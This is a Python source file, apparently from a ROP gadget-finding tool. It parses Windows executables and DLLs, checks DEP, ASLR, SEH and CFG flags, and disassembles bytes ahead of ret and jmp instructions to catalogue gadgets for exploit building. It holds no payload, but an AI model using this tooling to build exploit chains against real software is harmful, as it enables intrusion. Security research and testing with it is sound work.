import sys
import traceback
from capstone import *
import re
import pefile
import binascii
import copy
import os
from collections import OrderedDict
from lists import *
import win32api
import win32con
import ctypes
from ui import *
from ctypes import windll
from ctypes import wintypes
from parseconf import *
import win32file
import string
import csv
import json
import datetime
import timeit
from helpers import *
from gadgets import foundGadgets
from gadgets import *
import math
import platform
from ropemu import *
import pickle
from badBytes import *
from genCode import *
import copy
# from testingModule import *
import multiprocessing
import struct
from rop2FuncTester import *
platformType = platform.uname()[0]
import signal
try:
	if platformType == "Windows":
		import win32api
		import win32con
		import win32file
		import _win32sysloader
except Exception as e:
	print (e)
	print(traceback.format_exc())
	print ("Pywin32 needs to be installed.\nhttps://pypi.org/project/pywin32/\n\tThe setup.py is not always effective at installing Pywin32, so it may need to be manually done. Parts of this tool may not work without this; other parts will.\n")
# from selfModify import *
	# from ui import *
import colorama

excludeRegsGlobal =[]

conFile = str("config.cfg")
configOptions={}

colorama.init()

red ='\u001b[31;1m'
gre = '\u001b[32;1m'
yel = '\u001b[33;1m'
blu = '\u001b[34;1m'
mag = '\u001b[35;1m'
cya = '\u001b[36;1m'
whi = '\u001b[37m'
res = '\u001b[0m'
res2 = '\u001b[0m'

opt={"bImgExc":True,"bSystemDlls":True,"bOtherDlls":True,"bImgExcExtracted":True,"bSystemDllsExtracted":True,"bOtherDllsExtracted":True, "bx86Extracted":False,"bx64Extracted":False, "bx86Get":True, "bx64Get":True, "bx86Print":True, "bx64Print":True, "lenMax":0x10,"bytesMax":0x15, "acceptASLR": False, "acceptSEH":False, "acceptSystemWin":False, "acceptCFG":False, "checkForBadBytes":True,"badBytes":b'', "lookupMod":sys.argv[1], "regsExc":[]}
# "badBytes":b'\x93\x09\x11\x02\x03\x66\x05\x06\x03\x16
# "regsExc":["eax","ebx","ecx"]


oldsysOut=sys.stdout
my_stdout = open( 1, "w", buffering = 400000 )

sys.stdout = my_stdout
sys.stdout=oldsysOut
configOptions={}

myPE=""
peName=""
n=""
PE_path =""
m=[]
cs = Cs(CS_ARCH_X86, CS_MODE_32)
cs64 = Cs(CS_ARCH_X86, CS_MODE_64)

linesGoBackFindOP = 8
modName = peName
globalOuts =[]
limitedMemory = False
specialMissing = set()
loadP=False
availableRegs=["eax", "ebx","ecx","edx", "esi","edi","ebp"]

# fg = foundGadgets()
if len(sys.argv)==1:
	filename= sys.argv[1]
	dp("numargs")
if len(sys.argv) >1:
	if len(sys.argv) > 1:			# to get full functionality, need to put file location for binary that is installed (may need to find some DLLs in that directory)
		peName= sys.argv[1] 
		matchObj = re.match( r'^[a-z]+:[\\|/]+', peName, re.M|re.I)
		# if "\\" in filename:

		if matchObj:
			isPe=True
			head, tail = os.path.split(peName)
			peName = tail
			PE_path = head
			skipPath = True
		if not matchObj:
			skipPath = False
			PE_path=os.getcwd()

	PEtemp = PE_path + "/"+ peName
def stripWhite(str1):
	str1=str1.lstrip('\x00')
	str1=str1.lstrip('\x0a')
	str1=str1.lstrip('\x0d')
	str1=str1.rstrip('\x00')
	str1=str1.rstrip('\x0a')
	str1=str1.rstrip('\x0d')
	return str1
# def binaryToStr(binary, mode = None):
# 	newop=""
# 	try:
# 		if mode ==None or mode ==1:
# 			for v in binary:
# 				newop += "\\x"+"{0:02x}".format(v) #   e.g \\xab\\xac\\xad\\xae
# 			return newop
# 		elif mode==2:
# 			for v in binary:
# 				newop += "{0:02x}".format(v)		#   e.g abacadae
# 				dp ("newop",newop)
# 			return newop
# 		elif mode==3:
# 			for v in binary:
# 				newop += "{0:02x} ".format(v)    #   e.g ab ac ad ae
# 				dp ("newop",newop)
# 			return newop
# 	except Exception as e:
# 		dp ("*Not valid format")
# 		dp(e)

def dep():	
	global myPE
	return bool(myPE.OPTIONAL_HEADER.DllCharacteristics & 0x0100)
def aslr():
	global myPE
	return bool(myPE.OPTIONAL_HEADER.DllCharacteristics & 0x0040)
def seh():
	global myPE
	return bool(myPE.OPTIONAL_HEADER.DllCharacteristics & 0x0400)
def CFG():
	global myPE
	return bool(myPE.OPTIONAL_HEADER.DllCharacteristics & 0x4000)

def depDLL(myPE):	
	
	return bool(myPE.OPTIONAL_HEADER.DllCharacteristics & 0x0100)
def aslrDLL(myPE):
	
	return bool(myPE.OPTIONAL_HEADER.DllCharacteristics & 0x0040)
def sehDLL(myPE):
	
	return bool(myPE.OPTIONAL_HEADER.DllCharacteristics & 0x0400)
def CFGDLL(myPE):
	
	return bool(myPE.OPTIONAL_HEADER.DllCharacteristics & 0x4000)

def newPE(modName):
	global m
	global pe
	obj = PEInfo()
	m.append(obj)
	obj.setModName(modName)
	obj.setIsDLL(False)
	pe[modName]=obj
	# mod[dllName[:-4]]= WinDLL(dllName, base, path32, path64, expandedDLLsPath32, expandedDLLsPath64)

	# obj = PopGadget(modName)
	# pop[modName]=obj
def newDll(modName,path):
	dp ("newDll"," path", path, "modName", modName)
	global m
	global pe
	obj = PEInfo()
	m.append(obj)
	obj.setModName(modName)
	if path==None:
		obj.setSystem(False)
	else: 
		obj.setPath(path)
		# dp ("path", path, type(path))
		if "\\windows\\syswow64" in path.lower() or "\\windows\\system32" in path.lower() or "\\windows\\wins" in path.lower():
			obj.setSystem(True)
	pe[modName]=obj
	
dllDict={}
def findEvilImports(myPE):
	global dllDict
	try:
		for item in myPE.DIRECTORY_ENTRY_IMPORT:
			# print ("item", item)
			dllDict[item.dll.lower().decode()]={}
			for i in item.imports:
				try:
					dllDict[item.dll.lower().decode()][i.name.decode()]=i.address
				except:
					dllDict[item.dll.lower().decode()][i.name]=i.address
					pass
		dp (dllDict)
	except Exception as e:
		dp ("problem")
		print (e)
		print(traceback.format_exc())

	# try:
	# 	address=dllDict["kernel32.dll"]["LoadLibraryA"]
	# 	dp(hex(address))
	# except:
	# 	dp ("kernel32 is not there")

def Extraction():
	global o
	# global modName
	global peName
	global myPE
	global n
	global pe

	n = peName
	newPE(n)
	pe[n].setPeName(n)
	pe[n].setModName(n)
	dp(pe[n].peName)
	
	try: 
		try:
			head, tail = os.path.split(peName)
			modName = tail
			dp ("head", head, "tail", tail)
			dp (type(head), len(head))
			if type(head) == str and len(head) == 0:
				# dp ("i am the none!")
				head=os.getcwd()
		except:
			dp ("i am in the os split except")
			pass
		pe[n].path=PE_path
		PEtemp = PE_path + "/"+ peName
		myPE=None
		with disable_file_system_redirection():
			if skipPath == False:
				myPE = pefile.PE(peName)
			if skipPath == True:
				myPE = pefile.PE(PEtemp)
		t=0
		thereIsATextLabelled=False
		findEvilImports(myPE)
		for x in myPE.sections:
			name= stripWhite(myPE.sections[t].Name.decode())
			# print (name, len(name))
			matchObj = re.match( r'.text$|.code$|.TEXT$|.CODE$', name, re.M|re.I)
			if matchObj	:
				thereIsATextLabelled=True
				pe[n].setData(myPE.sections[t].get_data()[0:])		
				dp ("size", len(pe[n].data))
				pe[n].setVirtualAdd(myPE.sections[t].VirtualAddress)		
				pe[n].setVSize(myPE.sections[t].Misc_VirtualSize)		
				pe[n].setSizeOfRawData(myPE.sections[t].SizeOfRawData)		
				pe[n].setStartLoc(myPE.sections[t].VirtualAddress + myPE.OPTIONAL_HEADER.ImageBase)		
				pe[n].setImageBase(myPE.OPTIONAL_HEADER.ImageBase)		

				pe[n].setEndAddy(myPE.sections[t].VirtualAddress + myPE.OPTIONAL_HEADER.ImageBase + myPE.sections[t].Misc_VirtualSize)		
				pe[n].setEntryPoint(myPE.OPTIONAL_HEADER.AddressOfEntryPoint)
				pe[n].setSectionName(stripWhite(myPE.sections[t].Name.decode()))		
				pe[n].setHash_sha256(myPE.sections[t].get_hash_sha256())
				pe[n].setHash_md5(myPE.sections[t].get_hash_md5())
			t+=1
		if not thereIsATextLabelled:				
				pe[n].setData(myPE.sections[0].get_data()[0:])		
				dp ("size", len(pe[n].data))
				pe[n].setVirtualAdd(myPE.sections[0].VirtualAddress)		
				pe[n].setVSize(myPE.sections[0].Misc_VirtualSize)		
				pe[n].setSizeOfRawData(myPE.sections[0].SizeOfRawData)		
				pe[n].setStartLoc(myPE.sections[0].VirtualAddress + myPE.OPTIONAL_HEADER.ImageBase)	
				pe[n].setImageBase(myPE.OPTIONAL_HEADER.ImageBase)		

				pe[n].setEndAddy(myPE.sections[0].VirtualAddress + myPE.OPTIONAL_HEADER.ImageBase + myPE.sections[0].Misc_VirtualSize)		
				pe[n].setEntryPoint(myPE.OPTIONAL_HEADER.AddressOfEntryPoint)
				pe[n].setSectionName(stripWhite(myPE.sections[0].Name.decode()))		
				pe[n].setHash_sha256(myPE.sections[0].get_hash_sha256())
				pe[n].setHash_md5(myPE.sections[0].get_hash_md5())
		pe[n].setPeName(peName)
		pe[n].setModName(n)
		pe[n].setImageBase(myPE.OPTIONAL_HEADER.ImageBase)		
		pe[n].setExtracted(True)
		pe[n].setDEPStatus((dep()))		
		pe[n].setASLRStatus((aslr()))		
		pe[n].setSEHStatus((seh()))		
		pe[n].setCFGStatus((CFG()))		
		pe[n].setMagic(myPE.OPTIONAL_HEADER.Magic)
		

		try:
			for entry in myPE.DIRECTORY_ENTRY_IMPORT:
				name = entry.dll.decode()
				# dp (str(name))
				if entry.dll == "WSOCK32.dll":
					name = "ws2_32.dll"
				pe[n].dlls.append(name)
		except Exception as e:
			dp ("problem")
			dp (e)
			dp(traceback.format_exc())

	except Exception as e:
		dp ("problem2")

		dp (e)
		dp(traceback.format_exc())

def findDLL_IAT(dllName):
	# dp ("findDLL_IAT", dllName)
	global pe

		# A very small portin of this loadlibrary comes from: https://www.programcreek.com/python/example/53932/ctypes.wintypes.HANDLE
		# All of the elaborate loading through alternate means is entirely original
	#index = 0
	# dp dllName
#remove if could not be found
	# dp("INDEX = " + str(index))
	try:
		dllName = dllName.decode()
	except:
		pass

	# dp ("try1")
	ans_path = _win32sysloader.GetModuleFilename(dllName) or _win32sysloader.LoadModule(dllName)
	
	dp ("Success", ans_path)
	# input()
	newDll(dllName,ans_path)
	
	if ans_path==None:
		return False, dllName
	return True, None
def findDLLOther(dllName):
	dp("findDLLOther", dllName)
	ans_path=None
	for dll in pe[peName].files:
		if dllName.lower() in dll.lower():
			ans_path=dll
			dll_basename= os.path.basename(ans_path)
			# dp ("it is there", dll, dll_basename)
			try:
				pe[dll_basename].path=dll
			except:
				for dll_name in pe:
					if dll_basename.lower() == dll_name.lower():
						# dp("found it", dll_basename, dll_name)
						pe[dll_name].path=dll

	
	# dll_basename= os.path.basename(ans_path)
	# newDll(dll_basename,ans_path)
	# dp (dll_basename)
	dp ("end findDLLOther")


def star3333tFunc3(args):
	global fg
	dp ("startFunc3")
	pool = multiprocessing.Pool(cpu_count-1)
	out=pool.map(get_OP_RET_parallel, args)

	# dp ("out", out)
	# dp("type", type(out))
	pool.close()
	pool.join()
	KingFG=out[0]

	for foundG in out:
		KingFG.merge(foundG)

	dp ("king", KingFG)
	kingAfter=len(KingFG.pops)
	dp ("\nAFTER MERGE pops", kingAfter)
	fg=KingFG

def extractDlls():
	dp ("func extractDlls")
	# eDLLStart = timeit.default_timer()
	global doParallel
	global peName, n, pe

	myArgs=[]
	if not doParallel:
		dp ("not parallel")
		for dll in pe:
			if not pe[dll].skipDll and pe[dll].isDLL:
				extractDLLsEach(dll)

	if doParallel:
		for dll in pe:
			if pe[dll].isDLL and not pe[dll].skipDll:# and not pe[dll].systemWin:
				myArgs.append((dll,pe))	
		pool = multiprocessing.Pool(cpu_count-1)
		out=pool.map(extractDLLsEachParallel, myArgs)
		
		for each in out:
			if each==None:
				continue
			newPE=each[0]
			newDLLName=each[1]
			pe[newDLLName]=newPE
		# dp ("special out", out)
		# for each in out:
		# 	dll=each[]
		# dp("type", type(out))
		pool.close()
		pool.join()
	
	# eDLLSttop = timeit.default_timer()
	# dp("extractDlls time",  eDLLSttop-eDLLStart)

def extractDLLsEach(dll):
	dp ("extractDLLsEach",dll)
	global peName, n,pe
	try:
		dllPath=pe[dll].path
		dllName=pe[dll].modName
		myPE=None
		myPE = pefile.PE(pe[dll].path)
		pe[dll].setPeName(peName)
		pe[dll].setModName(dll)		
		pe[dll].setData(myPE.sections[0].get_data()[0:])		
		pe[dll].setVirtualAdd(myPE.sections[0].VirtualAddress)		
		pe[dll].setImageBase(myPE.OPTIONAL_HEADER.ImageBase)
		pe[dll].setMagic(myPE.OPTIONAL_HEADER.Magic)
		pe[dll].setVSize(myPE.sections[0].Misc_VirtualSize)		
		pe[dll].setSizeOfRawData(myPE.sections[0].SizeOfRawData)		
		pe[dll].setStartLoc(myPE.sections[0].VirtualAddress + myPE.OPTIONAL_HEADER.ImageBase)
		pe[dll].setImageBase(myPE.OPTIONAL_HEADER.ImageBase)		

		pe[dll].setEndAddy(myPE.sections[0].VirtualAddress + myPE.OPTIONAL_HEADER.ImageBase + myPE.sections[0].Misc_VirtualSize)		
		pe[dll].setEntryPoint(myPE.OPTIONAL_HEADER.AddressOfEntryPoint)
		pe[dll].setSectionName(stripWhite(myPE.sections[0].Name.decode()))		
		pe[dll].setDEPStatus((depDLL(myPE)))		
		pe[dll].setASLRStatus((aslrDLL(myPE)))		
		pe[dll].setSEHStatus((sehDLL(myPE)))		
		pe[dll].setCFGStatus((CFGDLL(myPE)))		
		pe[dll].setHash_sha256(myPE.sections[0].get_hash_sha256())
		pe[dll].setHash_md5(myPE.sections[0].get_hash_md5())
		pe[dll].setExtracted(True)
		# dp ("donehaha", pe[dll].SizeOfRawData, len(pe[dll].data))
	except Exception as e:
		dp ("big problem")
		dp (e)
		dp(traceback.format_exc())

def extractDLLsEachParallel(args):

	dp("extractDLLsEachParallel")

	#### no not create dictionary - create NEW object - the new object then is added to dict
	# make two spearate extract dlls, parallel and non parallel
	dll=args[0]
	pe=args[1]
	# dp ("dll", dll)
	# dp ("pe", pe, type(pe))
	newPE=PEInfo()
	global peName, n
	# print ("dll",dll)
	try:
		dllPath=pe[dll].path
		dllName=pe[dll].modName
		myPE=None
		myPE = pefile.PE(pe[dll].path)
		newPE.setPath(dllPath)
		newPE.setModName(dllName)
		newPE.setPeName(peName)
		newPE.setSystem(pe[dll].systemWin)
		newPE.setData(myPE.sections[0].get_data()[0:])		
		newPE.setMagic(myPE.OPTIONAL_HEADER.Magic)
		newPE.setVirtualAdd(myPE.sections[0].VirtualAddress)		
		newPE.setImageBase(myPE.OPTIONAL_HEADER.ImageBase)		
		newPE.setVSize(myPE.sections[0].Misc_VirtualSize)		
		newPE.setSizeOfRawData(myPE.sections[0].SizeOfRawData)		
		newPE.setStartLoc(myPE.sections[0].VirtualAddress + myPE.OPTIONAL_HEADER.ImageBase)		
		newPE.setImageBase(myPE.OPTIONAL_HEADER.ImageBase)		

		newPE.setEndAddy(myPE.sections[0].VirtualAddress + myPE.OPTIONAL_HEADER.ImageBase + myPE.sections[0].Misc_VirtualSize)		
		newPE.setEntryPoint(myPE.OPTIONAL_HEADER.AddressOfEntryPoint)
		newPE.setSectionName(stripWhite(myPE.sections[0].Name.decode()))		
		newPE.setDEPStatus((depDLL(myPE)))		
		newPE.setASLRStatus((aslrDLL(myPE)))		
		newPE.setSEHStatus((sehDLL(myPE)))		
		newPE.setCFGStatus((CFGDLL(myPE)))		
		newPE.setHash_sha256(myPE.sections[0].get_hash_sha256())
		newPE.setHash_md5(myPE.sections[0].get_hash_md5())
		newPE.setExtracted(True)
		return newPE,dll
	except Exception as e:
		print (" Extraction did not suceed for ", dll)

		dp (red+"extractDLLsEachParallel error", e,res)
		dp(traceback.format_exc())

def extractDll():
	n=originalN
	# for each in pe[n].dlls


# inspired by https://stackoverflow.com/questions/18394147/how-to-do-a-recursive-sub-folder-search-and-return-files-in-a-list


def run_fast_scandir(dir1, fileExt,n):
    dp ("run_fast_scandir", dir1, fileExt, n)
    subdirectories, files = [], []
    subdSet, filesSet =set(), set()
    for potential in os.scandir(dir1):
        # dp ("p", potential)
        if potential.is_file():
            if os.path.splitext(potential.name)[1].lower() in fileExt:
                # dp ("potential path", potential.path)
                pe[n].files.append(potential.path)
                files.append(potential.path)
                # if potential.path not in pe[n].filesSet:
                #     pe[n].files.append(potential.path)
                #     files.append(potential.path)
                #     pe[n].filesSet.add(potential.path)

        if potential.is_dir():
            # dp ("****potential dir", potential)
            if potential.path not in pe[n].subdirectories:
                pe[n].subdirectories.append(potential.path)
                subdirectories.append(potential.path)
                pe[n].subdirectoriesSet.add(potential.path)


    for dir2 in list(subdirectories):
        sd, f = run_fast_scandir(dir1, fileExt,n)
        files.extend(f)
        subdirectories.extend(sd)
    # dp ("\n\n\nfiles",files)
    # dp("\n\n\nsubdirectories", subdirectories)
    files = list(set(files))
    subdirectories=list(set(subdirectories))
    pe[n].files=list(set(pe[n].files))
    return files, subdirectories

def printPEValuesDict():
	dp ("printPEValues")
	global m
	# dp (len(m))

	for n in pe:
		if not pe[n].isDLL:
			print("Module:", (pe[n].modName))
			print("Section Name:", (pe[n].sectionName))
			print("Entry Point:",hex(pe[n].entryPoint))
			print("Virtual Address:", hex(pe[n].VirtualAdd))
			print("ImageBase:", hex(pe[n].ImageBase))
			print("VirtualSize:", hex(pe[n].vSize))
			print("Starting Loc:", hex(pe[n].startLoc))
			print("End address:", hex(pe[n].endAddy))
			print("SizeOfRawData:", hex(pe[n].SizeOfRawData))
			print("Hash_sha256_section:", pe[n].Hash_sha256_section)
			print("Hash_md5_section:", pe[n].Hash_md5_section)
			print("DEP:", pe[n].depStatus)
			print("ASLR:", pe[n].aslrStatus)
			print("SEH:", pe[n].sehStatus)
			print("CFG:", pe[n].CFGStatus)
			print("Actual size of Data:", hex(len(pe[n].data)))
		else:
			print("Module:", (pe[n].modName), "path", pe[n].path, "Windows system dll:", pe[n].systemWin)
			print("\tActual size of Data:", hex(len(pe[n].data)))
			print("\tSizeOfRawData:", hex(pe[n].SizeOfRawData))
			print("\tmagic:", hex(pe[n].magic))






def get_OP_RET(numBytes):
	dp ("get_OP_RET:")
	# start = timeit.default_timer()

	global o
	# while numOps > 2:   # Num of Ops to go back
	try:
		for n in pe:
			if not pe[n].skipDll:
				t=0;		
				for v in pe[n].data:
					if ((pe[n].data[t]) == OP_RET[0]):
						numOps = numBytes
						while numOps > 1:
							# dp ("found one")
							disHereRet(n,t, numOps)
							numOps = numOps - 1
						disHereRetSingle(dll,t + begin, 0,pe)
					elif ((pe[n].data[t]) == OP_RET2[0]):
						numOps = numBytes
						while numOps > 2:
							# dp ("found one")
							disHereRetC2(n,t, numOps)
							numOps = numOps - 1
						disHereRetSingleC2(dll,t + begin, 0,pe)
					elif ((pe[n].data[t]) == OP_CALL_JMP_FS_START[0]):
						if ((pe[n].data[t+1]) == OP_CALL_JMP_FS_START[1]):
							# if (pe[n].data[t+2] >= 0x10 and pe[n].data[t+2] <0x18) or (pe[n].data[t+2] >=0x20 and pe[n].data[t+2] < 0x28):  #JMP and CALL
							if (pe[n].data[t+2] >=0x20 and pe[n].data[t+2] < 0x28) or (pe[n].data[t+2] >=0x60 and pe[n].data[t+2] < 0x68) or (pe[n].data[t+2] >=0xa0 and pe[n].data[t+2] < 0xa7): #JMP
								disHereCallFS(n,t, pe[n].data[t+2])
							
							# CODED2 = pe[n].data[(t):(t+2)]	

							# numOps = numBytes
							# while numOps > 2:
							# 	disHereRet(n,t, numOps, True)
							# 	numOps = numOps - 1
					t=t+1
				# numOps = numOps -1
	except IndexError as e:
		dp (e)
		dp ("n", n, t)
	# stop = timeit.default_timer()
	# dp("Time 2: " + str(stop - start))




def get_OP_RET_parallel(args):
# def get_OP_RET_parallel(numBytes, begin, end):
	# global pe
	global rop
	numBytes =args[0]
	begin =args[1]
	end =args[2]
	pe=args[3]
	rop=args[4]
	dll=args[5]
	dp ("mp current_process", multiprocessing.current_process())

	dp ("get_OP_RET_parallel args", args, "numBytes", numBytes, "begin", begin,"end",end)
	dp ("get_OP_RET:", numBytes, begin, end)
	# start = timeit.default_timer()
	
	# fg = foundGadgets()
	global o
	# while numOps > 2:   # Num of Ops to go back
	t=0;	
	try:	
		dp ("hi1", dll)
		dp ("hi2", pe[dll].modName, len(pe[dll].data), pe[dll].SizeOfRawData)
		dp ("begin", begin, "end", end)
		ourData = pe[dll].data[begin:end+1]
		dp (len(ourData))
		for v in ourData:
			if ((ourData[t]) == OP_RET[0]):
				numOps = numBytes
				while numOps > 0:
					disHereRet(dll,t + begin, numOps,pe)
					numOps = numOps - 1
				disHereRetSingle(dll,t + begin, 0,pe)
			elif ((ourData[t]) == OP_RET2[0]):
				numOps = numBytes
				while numOps > 2:
					# dp ("found one")
					disHereRetC2(dll,t + begin, numOps,pe)
					numOps = numOps - 1
				disHereRetSingleC2(dll,t + begin, 0,pe)				
			elif ((ourData[t]) == OP_RETF[0]):
				numOps = numBytes
				while numOps >= 0:
					dp ("found retf hg!")
					disHereRetf(dll,t + begin, numOps,pe)
					numOps = numOps - 1
			elif ((ourData[t]) == OP_CALL_JMP_FS_START[0]):
				if ((ourData[t+1]) == OP_CALL_JMP_FS_START[1]):
					# dp ("special return early")
					# return
					# if (ourData[t+2] >= 0x10 and ourData[t+2] <0x18) or (ourData[t+2] >=0x20 and ourData[t+2] < 0x28):  #JMP and CALL
					if (ourData[t+2] >=0x20 and ourData[t+2] < 0x28) or (ourData[t+2] >=0x60 and ourData[t+2] < 0x68) or (ourData[t+2] >=0xa0 and ourData[t+2] < 0xa7): #JMP
						disHereCallFS(dll,t + begin, ourData[t+2])
			elif (ourData[t:t+2] in setOpsCF2):
				disHereJmpCall(dll,t+begin,pe)
			t=t+1
			# numOps = numOps -1
		# stop = timeit.default_timer()
		# dp("Time 2: " + str(stop - start))
		# dp ("before return for merge fg pops", len(fg.pops))

		return fg
	except Exception as e:
		dp("parallel error")
		dp(e)
		dp(traceback.format_exc())
		return fg

def get_OP_RET_parallel64(args):
# def get_OP_RET_parallel(numBytes, begin, end):
	# global pe
	global rop
	numBytes =args[0]
	begin =args[1]
	end =args[2]
	pe=args[3]
	rop=args[4]
	dll=args[5]
	dp("mp current_process", multiprocessing.current_process())

	dp("get_OP_RET_parallel args", args, "numBytes", numBytes, "begin", begin,"end",end)
	dp("get_OP_RET:", numBytes, begin, end)
	# start = timeit.default_timer()
	
	# fg = foundGadgets()
	global o
	# while numOps > 2:   # Num of Ops to go back
	t=0;	
	try:	
		dp("hi1", dll)
		dp("hi2", pe[dll].modName, len(pe[dll].data), pe[dll].SizeOfRawData)
		dp("begin", begin, "end", end)
		ourData = pe[dll].data[begin:end+1]
		dp(len(ourData))
		for v in ourData:
			if ((ourData[t]) == OP_RET[0]):
				numOps = numBytes
				while numOps > 0:
					disHereRet64(dll,t + begin, numOps,pe)
					numOps = numOps - 1
				disHereRetSingle64(dll,t + begin, 0,pe)
			elif ((ourData[t]) == OP_RET2[0]):
				numOps = numBytes
				while numOps > 2:
					# dp ("found one")
					disHereRetC264(dll,t + begin, numOps,pe)
					numOps = numOps - 1
				disHereRetSingleC264(dll,t + begin, 0,pe)				
			elif ((ourData[t]) == OP_RETF[0]):
				numOps = numBytes
				while numOps >= 0:
					disHereRetf64(dll,t + begin, numOps,pe)
					numOps = numOps - 1
			elif ((ourData[t]) == OP_CALL_JMP_FS_START[0]):
				if ((ourData[t+1]) == OP_CALL_JMP_FS_START[1]):
					# dp ("special return early")
					# return
					# if (ourData[t+2] >= 0x10 and ourData[t+2] <0x18) or (ourData[t+2] >=0x20 and ourData[t+2] < 0x28):  #JMP and CALL
					if (ourData[t+2] >=0x20 and ourData[t+2] < 0x28) or (ourData[t+2] >=0x60 and ourData[t+2] < 0x68) or (ourData[t+2] >=0xa0 and ourData[t+2] < 0xa7): #JMP
						# disHereCallFS(dll,t + begin, ourData[t+2])
						pass
			elif (ourData[t:t+2] in setOpsCF2):
				disHereJmpCall64(dll,t+begin,pe)
				pass
			t=t+1
			# numOps = numOps -1
		# stop = timeit.default_timer()
		# dp("Time 2: " + str(stop - start))
		# dp ("before return for merge fg pops", len(fg.pops))

		return fg
	except Exception as e:
		dp("parallel error")
		dp(e)
		dp(traceback.format_exc())
		return fg
def disHerePushRet(address, numBytes, secNum, data): ############################# AUSTIN ############################
	CODED2 = ""
	x = numBytes

	if(secNum != "noSec"):
		section = s[secNum]
		# start = timeit.default_timer()
	CODED2 = data[address:(address+numBytes)]

	# I create the individual lines of code that will appear>
	val =""
	val2 = []
	val3 = []
	#address2 = address + section.ImageBase + section.VirtualAdd
	val5 =[]
	points = 0	
	foundPush = False
	foundRet = False
	pushreg = ""
	# start = timeit.default_timer()
	CODED3 = CODED2
	for i in cs.disasm(CODED3, address):
		if(secNum == "noSec"):
			# add = hex(int(i.address))
			add4 = hex(int(i.address))
			addb = hex(int(i.address))
		else:
			add = hex(int(i.address))
			addb = hex(int(i.address +  section.VirtualAdd))
			add2 = str(add)
			add3 = hex (int(i.address + section.startLoc	))
			add4 = str(add3)
		val =  i.mnemonic + " " + i.op_str + "\t\t\t\t"  + add4 + " (offset " + addb + ")\n"
		val5.append(val)

		push = re.match("^push (e((ax)|(bx)|(cx)|(dx)|(di)|(si)|(bp)|(sp)))", val, re.IGNORECASE)
		if(push):
			pushreg = i.op_str
			foundPush = True
			# points += 1
			pushOffset = addb

if platformType == "Windows":
    # https://code.activestate.com/recipes/578035-disable-file-system-redirector/
    class disable_file_system_redirection:
        _disable = ctypes.windll.kernel32.Wow64DisableWow64FsRedirection
        _revert = ctypes.windll.kernel32.Wow64RevertWow64FsRedirection
        def __enter__(self):
        	# pass
            self.old_value = ctypes.c_long()
            self.success = self._disable(ctypes.byref(self.old_value))
        def __exit__(self, type, value, traceback):
            # pass
            if self.success:
                self._revert(self.old_value)


class doGadgets:
	def __init__(self):
		self.info=1
					

	def do(self, name: str, testVal,saveq, offL,op_str,lGoBack, n, raw,mnemonicL, op_strL,c2=False):
		# if "fs" not in testVal:
		# 	return
		# if "add" not in name or "pop" not in name:
		# 	return
		# check1=name+" "+hex(offL[lGoBack])
		# check1=raw.hex()+hex(offL[lGoBack])
		check1=raw.hex()+hex(saveq)
		if (check1) not in fg.junkBox and "ret" != name:
		# if 1==1:
			do = f"do_{name}"

			if hasattr(self, do) and callable(func := getattr(self, do)):
				obj=func(testVal,saveq, offL,op_str,lGoBack, n, raw,mnemonicL, op_strL, c2)
				dp("do func", name, hex(offL[lGoBack]))
				fg.junkBox.add(check1)
		# specialMissing.add(name)
		# self.do_unusual(testVal,saveq, offL,op_str,lGoBack, n, raw,mnemonicL, op_strL, c2=False)		

	def do2(self, name: str, testVal,saveq, offL,op_str,lGoBack, n, raw,mnemonicL, op_strL,c2=False):
		check1=raw.hex()+hex(saveq)
		if (check1) not in fg.junkBox:
		# if 1==1:
			do = f"do_ret"

			if hasattr(self, do) and callable(func := getattr(self, do)):
				obj=func(testVal,saveq, offL,op_str,lGoBack, n, raw,mnemonicL, op_strL, c2)
				dp("do func", name, hex(offL[lGoBack]))
				fg.junkBox.add(check1)
		# specialMissing.add(name)
		# self.do_unusual(testVal,saveq, offL,op_str,lGoBack, n, raw,mnemonicL, op_strL, c2=False)		
	def doJmp(self, name: str, testVal,saveq, offL,op_str,lGoBack, n, raw,mnemonicL, op_strL,c2,jmp=False):
		dp("doJmp func")
		check1=raw.hex()+hex(saveq)
		if (check1) not in fg.junkBox:
		# if 1==1:
			do = f"go_{name}"
			# do=do.replace(" ","_")
			# do=do.replace("[","")
			# do=do.replace("]","")
			dp("gogo", do)

			if hasattr(self, do) and callable(func := getattr(self, do)):
				obj=func(testVal,saveq, offL,op_str,lGoBack, n, raw,mnemonicL, op_strL, c2)
				dp("go func", name, hex(offL[lGoBack]))
				fg.junkBox.add(check1)

	def extractOffset(self,testVal):
		dp("extractOffset")
		opVal = re.findall("[+|-]+ 0x[0-9a-f]+|[+|-]+ [0-9a-f]", testVal, re.IGNORECASE)
		if opVal:
			try:
				keep=eval("0"+opVal[0])
				dp("keep",keep)
				return True,keep
			except:
				dp("not valid")
		return False,None
	def go_jmp(self,testVal,saveq, offL,op_str,lGoBack, n, raw,mnemonicL, op_strL, c2):
		dp("in do_jmp", testVal)

		if "dword" not in testVal:
			if re.match( r'\bjmp esi\b', testVal, re.M|re.I):
				addGadgetJmp(saveq, pe,n,offL[lGoBack],op_str, raw, n, "jmp", eax, fg.jmpESI)
			elif re.match( r'\bjmp ebp\b', testVal, re.M|re.I):
				addGadgetJmp(saveq, pe,n,offL[lGoBack],op_str, raw, n, "jmp", ebp, fg.jmpEBP)
			elif re.match( r'\bjmp edi\b', testVal, re.M|re.I):
				addGadgetJmp(saveq, pe,n,offL[lGoBack],op_str, raw, n, "jmp", edi, fg.jmpEDI)
			elif re.match( r'^jmp eax',testVal, re.M|re.I):
				dp("saving jmp eax")
				addGadgetJmp(saveq, pe,n,offL[lGoBack],op_str, raw, n, "jmp", eax, fg.jmpEAX)
			elif re.match( r'^jmp ebx', testVal, re.M|re.I):
				addGadgetJmp(saveq, pe,n,offL[lGoBack],op_str, raw, n, "jmp", ebx, fg.jmpEBX)
			elif re.match( r'\bjmp esp\b',testVal, re.M|re.I):
				addGadgetJmp(saveq, pe,n,offL[lGoBack],op_str, raw, n, "jmp", esp, fg.jmpESP)	
			elif re.match( r'\bjmp ecx\b', testVal, re.M|re.I):
				addGadgetJmp(saveq, pe,n,offL[lGoBack],op_str, raw, n, "jmp", ecx, fg.jmpECX)
			elif re.match( r'\bjmp edx\b', testVal, re.M|re.I):
				addGadgetJmp(saveq, pe,n,offL[lGoBack],op_str, raw, n, "jmp", edx, fg.jmpEDX)
		else:
			if "[ebp" in testVal:
				if "jmp dword ptr [ebp]" in testVal:
					addGadgetJmp(saveq, pe,n,offL[lGoBack],op_str, raw, n, "jmp", ebp, fg.jmpDwordEBP)
				elif re.match( r'jmp dword ptr \[ebp [+|-]+', testVal, re.M|re.I):
					foundOffset,offVal=self.extractOffset(op_strL[lGoBack])
					if foundOffset:
